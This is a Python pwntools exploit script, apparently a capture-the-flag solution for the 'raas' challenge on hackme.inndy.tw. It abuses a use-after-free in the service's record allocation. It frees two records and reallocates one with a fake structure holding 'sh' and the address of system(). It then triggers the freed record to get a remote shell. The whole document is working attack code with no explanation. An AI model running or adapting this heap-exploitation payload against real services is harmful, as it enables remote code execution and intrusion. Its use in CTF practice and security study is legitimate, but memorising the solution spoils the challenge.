from pwn import *
context(log_level = "debug", terminal = ["deepin-terminal", "-x", "sh", "-c"])
	

def do_new(target, index, type, value):
	target.sendlineafter('Act > ',str(1))
	target.sendlineafter('Index > ',str(index))
	target.sendlineafter('Type > ',str(type))
	if type == 2:
		target.sendlineafter('Length > ', str(11))
		target.sendlineafter('Value > ',str(value))
	else:
		target.sendlineafter('Value > ',str(value))


def do_del(target, index):
	target.sendlineafter('Act > ', str(2))
	target.sendlineafter('Index > ',str(index))

def main():
	elf = ELF('./raas')
	target = remote('hackme.inndy.tw', 7719)
	do_new(target,0,1,3)
	do_new(target,1,2,'1111')
	do_del(target,1)
	do_del(target,0)
	payload = ''
	payload += fit({0x0:['sh\x00\x00',p32(elf.symbols['system'])]})
	do_new(target,2,2,payload)
	do_del(target,1)
	target.interactive()

def debug():
    raw_input('debug:')
    gdb.attach(target, "set follow-fork-mode parent\nb *" + '0x080487A3')



if __name__ == '__main__':
	main()